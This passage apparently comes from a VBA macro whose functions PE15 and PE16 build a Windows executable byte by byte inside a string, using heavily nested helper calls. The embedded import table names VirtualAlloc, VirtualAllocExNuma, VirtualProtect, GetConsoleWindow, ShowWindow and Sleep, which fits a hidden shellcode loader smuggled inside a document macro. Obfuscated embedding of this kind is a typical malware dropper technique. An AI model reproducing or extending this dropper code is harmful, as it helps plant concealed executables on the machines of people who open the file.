    strPE = A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(strPE, 2), 0), 5), "R"), 1), "0"), 1), 16), 9), 0), 16), "B"), 12), "0"), 11), "`"), 10), "p"), 9), "P"), 8), 192), 6), 208), 4), 224), 2), 240), 0), 0), 1), 14), 8), 0), 14), "2"), 10), "0"), 9), "`"), 8), "p"), 7), "P"), 6), 192), 4), 208), 2), 224)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(strPE, 1), 14), 8), 0), 14), "2"), 10), "0"), 9), "`"), 8), "p"), 7), "P"), 6), 192), 4), 208), 2), 224), 1), 0), 0), 0), 1), 10), 6), 0), 10), "2"), 6), "0"), 5), "`"), 4), "p"), 3), "P"), 2), 192), 1), 3), 2), 0), 3), "0"), 2), 192), 1), 7)
    strPE = A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(strPE, 4), 0), 7), "2"), 3), "0"), 2), "`"), 1), "p"), 1), 0), 0), 0), 1), 0), 0), 0), 1), 0), 0), 0), 1), 6), 3), 0), 6), 130), 2), "0"), 1), "p"), 0), 0), 1), 11), 6), 0), 11), "r"), 7), "0"), 6), "`"), 5), "p"), 4), 192), 2), 208)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(strPE, 1), 14), 8), 0), 14), "r"), 10), "0"), 9), "`"), 8), "p"), 7), "P"), 6), 192), 4), 208), 2), 224), 1), 9), 5), 0), 9), 130), 5), "0"), 4), "`"), 3), "p"), 2), 192), 0), 0), 1), 4), 1), 0), 4), 162), 0), 0), 1), 8), 4), 0), 8), "R")
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(strPE, 4), "0"), 3), "`"), 2), 192), 1), 14), 8), 0), 14), "R"), 10), "0"), 9), "`"), 8), "p"), 7), "P"), 6), 192), 4), 208), 2), 224), 1), 5), 2), 0), 5), "2"), 1), "0"), 1), 0), 0), 0), 1), 0), 0), 0), 1), 5), 2), 0), 5), "2"), 1), "0")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(strPE, 1), 5), 2), 0), 5), "2"), 1), "0"), 1), 0), 0), 0), 1), 0), 0), 0), 1), 0), 0), 0), 1), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "P"), 224), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 204), 231), 0), 0), "8"), 226), 0), 0), 248), 224), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "p"), 232), 0), 0), 224), 226), 0), 0), "("), 226), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 128), 232), 0), 0), 16), 228), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), " "), 228), 0), 0), 0), 0), 0), 0), "8"), 228), 0), 0), 0), 0), 0), 0), "P"), 228), 0), 0), 0), 0), 0), 0), "d"), 228), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "x"), 228), 0), 0), 0), 0), 0), 0), 136), 228), 0), 0), 0), 0), 0), 0), 154), 228), 0), 0), 0), 0), 0), 0), 170), 228), 0), 0), 0), 0), 0), 0), 186), 228), 0), 0), 0), 0), 0), 0), 214), 228), 0), 0), 0), 0), 0), 0), 234), 228)
    strPE = A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 2), 229), 0), 0), 0), 0), 0), 0), 24), 229), 0), 0), 0), 0), 0), 0), "6"), 229), 0), 0), 0), 0), 0), 0), ">"), 229), 0), 0), 0), 0), 0), 0), "L"), 229), 0), 0), 0), 0), 0), 0), "\"), 229), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "r"), 229), 0), 0), 0), 0), 0), 0), 132), 229), 0), 0), 0), 0), 0), 0), 148), 229), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 170), 229), 0), 0), 0), 0), 0), 0), 194), 229), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 216), 229), 0), 0), 0), 0), 0), 0), 238), 229), 0), 0), 0), 0), 0), 0), 254), 229), 0), 0), 0), 0), 0), 0), 10), 230), 0), 0), 0), 0), 0), 0), 24), 230), 0), 0), 0), 0), 0), 0), "("), 230), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(strPE, ":"), 230), 0), 0), 0), 0), 0), 0), "N"), 230), 0), 0), 0), 0), 0), 0), "X"), 230), 0), 0), 0), 0), 0), 0), "f"), 230), 0), 0), 0), 0), 0), 0), "p"), 230), 0), 0), 0), 0), 0), 0), "|"), 230), 0), 0), 0), 0), 0), 0), 134), 230)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 144), 230), 0), 0), 0), 0), 0), 0), 156), 230), 0), 0), 0), 0), 0), 0), 164), 230), 0), 0), 0), 0), 0), 0), 174), 230), 0), 0), 0), 0), 0), 0), 184), 230), 0), 0), 0), 0), 0), 0), 192), 230), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 202), 230), 0), 0), 0), 0), 0), 0), 210), 230), 0), 0), 0), 0), 0), 0), 220), 230), 0), 0), 0), 0), 0), 0), 228), 230), 0), 0), 0), 0), 0), 0), 236), 230), 0), 0), 0), 0), 0), 0), 246), 230), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 4), 231), 0), 0), 0), 0), 0), 0), 14), 231), 0), 0), 0), 0), 0), 0), 24), 231), 0), 0), 0), 0), 0), 0), 34), 231), 0), 0), 0), 0), 0), 0), ","), 231), 0), 0), 0), 0), 0), 0), "8"), 231), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(strPE, "B"), 231), 0), 0), 0), 0), 0), 0), "L"), 231), 0), 0), 0), 0), 0), 0), "V"), 231), 0), 0), 0), 0), 0), 0), "b"), 231), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "l"), 231), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), " "), 228), 0), 0), 0), 0), 0), 0), "8"), 228), 0), 0), 0), 0), 0), 0), "P"), 228), 0), 0), 0), 0), 0), 0), "d"), 228), 0), 0), 0), 0), 0), 0), "x"), 228), 0), 0), 0), 0), 0), 0), 136), 228), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 154), 228), 0), 0), 0), 0), 0), 0), 170), 228), 0), 0), 0), 0), 0), 0), 186), 228), 0), 0), 0), 0), 0), 0), 214), 228), 0), 0), 0), 0), 0), 0), 234), 228), 0), 0), 0), 0), 0), 0), 2), 229), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 24), 229), 0), 0), 0), 0), 0), 0), "6"), 229), 0), 0), 0), 0), 0), 0), ">"), 229), 0), 0), 0), 0), 0), 0), "L"), 229), 0), 0), 0), 0), 0), 0), "\"), 229), 0), 0), 0), 0), 0), 0), "r"), 229), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 132), 229), 0), 0), 0), 0), 0), 0), 148), 229), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 170), 229), 0), 0), 0), 0), 0), 0), 194), 229), 0), 0), 0), 0), 0), 0), 216), 229), 0), 0), 0), 0), 0), 0), 238), 229)
    strPE = A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 254), 229), 0), 0), 0), 0), 0), 0), 10), 230), 0), 0), 0), 0), 0), 0), 24), 230), 0), 0), 0), 0), 0), 0), "("), 230), 0), 0), 0), 0), 0), 0), ":"), 230), 0), 0), 0), 0), 0), 0), "N"), 230), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "X"), 230), 0), 0), 0), 0), 0), 0), "f"), 230), 0), 0), 0), 0), 0), 0), "p"), 230), 0), 0), 0), 0), 0), 0), "|"), 230), 0), 0), 0), 0), 0), 0), 134), 230), 0), 0), 0), 0), 0), 0), 144), 230), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 156), 230), 0), 0), 0), 0), 0), 0), 164), 230), 0), 0), 0), 0), 0), 0), 174), 230), 0), 0), 0), 0), 0), 0), 184), 230), 0), 0), 0), 0), 0), 0), 192), 230), 0), 0), 0), 0), 0), 0), 202), 230), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 210), 230), 0), 0), 0), 0), 0), 0), 220), 230), 0), 0), 0), 0), 0), 0), 228), 230), 0), 0), 0), 0), 0), 0), 236), 230), 0), 0), 0), 0), 0), 0), 246), 230), 0), 0), 0), 0), 0), 0), 4), 231), 0), 0), 0), 0), 0), 0), 14), 231)
    strPE = A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 24), 231), 0), 0), 0), 0), 0), 0), 34), 231), 0), 0), 0), 0), 0), 0), ","), 231), 0), 0), 0), 0), 0), 0), "8"), 231), 0), 0), 0), 0), 0), 0), "B"), 231), 0), 0), 0), 0), 0), 0), "L"), 231), 0), 0)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "V"), 231), 0), 0), 0), 0), 0), 0), "b"), 231), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "l"), 231), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 27), 1), "Dele")
    strPE = B(A(A(A(A(B(A(B(A(B(strPE, "teCriticalSection"), 0), "?"), 1), "EnterCriticalSection"), 0), 0), 24), 2), "GetCon")
    strPE = A(A(A(A(B(A(B(A(B(A(B(A(A(B(strPE, "soleWindow"), 0), 0), "("), 2), "GetCurrentProcess"), 0), "v"), 2), "GetLastError"), 0), 0), 231), 2)
    strPE = A(B(A(A(B(A(A(A(B(A(A(A(B(strPE, "GetStartupInfoA"), 0), 251), 2), "GetSystemInfo"), 0), 31), 3), "GetTickCount"), 0), 0), "|"), 3)
    strPE = B(A(A(A(A(B(A(A(A(B(strPE, "InitializeCriticalSection"), 0), 151), 3), "IsDBCSLeadByteEx"), 0), 0), 216), 3), "Le")
    strPE = B(A(B(A(B(A(A(A(A(B(strPE, "aveCriticalSection"), 0), 0), 12), 4), "MultiByteToWideChar"), 0), "r"), 5), "SetUnh")

    PE15 = strPE
End Function

Private Function PE16() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "andledExceptionFilter"), 0), 130), 5), "Sleep"), 0), 165), 5), "TlsGetValue"), 0), 206), 5), "Virt")
    strPE = A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "ualAlloc"), 0), 0), 208), 5), "VirtualAllocExNuma"), 0), 0), 212), 5), "VirtualProtect"), 0), 0)
    strPE = B(A(B(A(B(A(A(A(A(B(A(A(strPE, 214), 5), "VirtualQuery"), 0), 0), 11), 6), "WideCharToMultiByte"), 0), "8"), 0), "__C_specif")
    strPE = B(A(B(A(B(A(B(A(A(B(strPE, "ic_handler"), 0), 0), "@"), 0), "___lc_codepage_func"), 0), "C"), 0), "___mb_cur_max_")
    strPE = A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(strPE, "func"), 0), 0), "R"), 0), "__getmainargs"), 0), "S"), 0), "__initenv"), 0), "T"), 0), "__iob_func"), 0), 0), "["), 0)
    strPE = B(A(B(A(A(B(A(B(A(A(B(strPE, "__lconv_init"), 0), 0), "a"), 0), "__set_app_type"), 0), 0), "c"), 0), "__setusermatherr")
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(strPE, 0), 0), "r"), 0), "_acmdln"), 0), "y"), 0), "_amsg_exit"), 0), 0), 139), 0), "_cexit"), 0), 0), 151), 0), "_commode"), 0), 0), 190), 0)
    strPE = A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "_errno"), 0), 0), 220), 0), "_fmode"), 0), 0), 29), 1), "_initterm"), 0), 131), 1), "_lock"), 0), ")"), 2), "_onexit"), 0), 202), 2)
    strPE = B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "_unlock"), 0), 138), 3), "abort"), 0), 155), 3), "calloc"), 0), 0), 168), 3), "exit"), 0), 0), 188), 3), "fprintf"), 0), 190), 3), "fput")
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(strPE, "c"), 0), 195), 3), "free"), 0), 0), 208), 3), "fwrite"), 0), 0), 249), 3), "localeconv"), 0), 0), 255), 3), "malloc"), 0), 0), 7), 4), "memc")
    strPE = B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(strPE, "py"), 0), 0), 9), 4), "memset"), 0), 0), "'"), 4), "signal"), 0), 0), "<"), 4), "strerror"), 0), 0), ">"), 4), "strlen"), 0), 0), "A"), 4), "st")
    strPE = B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(B(strPE, "rncmp"), 0), "G"), 4), "strstr"), 0), 0), "c"), 4), "vfprintf"), 0), 0), "}"), 4), "wcslen"), 0), 0), "a"), 3), "ShowWindow")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), 0), 224), 0), 0), "KERNEL32.dll"), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), 20), 224), 0), 0), "ms")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(strPE, "vcrt.dll"), 0), 0), "("), 224), 0), 0), "USER32.dll"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), "@"), 17), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 16), 16), "@"), 0), 0), 0), 0), 0), 160), 27), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0)
